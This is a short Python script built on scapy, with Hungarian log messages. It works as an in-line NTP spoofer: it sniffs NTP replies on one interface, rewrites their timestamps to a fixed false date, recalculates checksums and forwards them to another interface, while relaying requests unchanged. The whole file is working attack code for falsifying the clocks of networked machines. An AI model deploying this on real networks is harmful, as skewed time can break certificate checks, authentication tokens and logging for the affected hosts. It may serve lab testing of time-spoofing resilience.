import threading
from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSRR, NTP


def modify_ntp_packet(packet):
    try:
        packet[NTP].recv = "Fri Jun 14 10:40:51 2028"
        packet[NTP].sent = "Fri Jun 14 10:40:52 2028"

        # Recalculate checksums
        del packet[UDP].len
        del packet[UDP].chksum
        del packet[IP].len
        del packet[IP].chksum

        return packet
    except Exception as e:
        print(f"Error modifying NTP packet: {e}")
        return None

def ntp_kartya1(iface1, iface2, hostDict, stop_event):
	print('NTP kartya 1 mukszik')
	while not stop_event.is_set():
		pkt = sniff(iface=iface1, filter="udp and src port 123", store=1, count=1, stop_filter=lambda x: stop_event.is_set())
		if pkt:
			packet = pkt[0]
			if packet.haslayer(NTP):
				modified_packet = modify_ntp_packet(packet)
				modified_info = modified_packet.summary()
				from ui import packet_queue
				packet_queue.put((modified_info, True, True))
				if modified_packet:
					sendp(modified_packet, iface=iface2, verbose=0, count=1)
					print("Elkuldve NTP modositva")
			del packet
			del pkt

def ntp_kartya2(iface1, iface2, hostDict, stop_event):
	print('NTP kartya 2 mukszik')
	while not stop_event.is_set():
		pkt = sniff(iface=iface2, filter="udp and dst port 123", store=1, count=1, stop_filter=lambda x: stop_event.is_set())
		if pkt:
			packet = pkt[0]
			if packet.haslayer(NTP):
				try:
					print("NTP KERES KULDESE")
					packet_info = packet.summary()
					from ui import packet_queue
					packet_queue.put((packet_info, False,False))
					sendp(packet, iface=iface1, verbose=0, count=1)
				except Exception as e:
					print(f"Nem tudta elkuldeni: {e}")
					packet.show()
			del pkt
			del packet
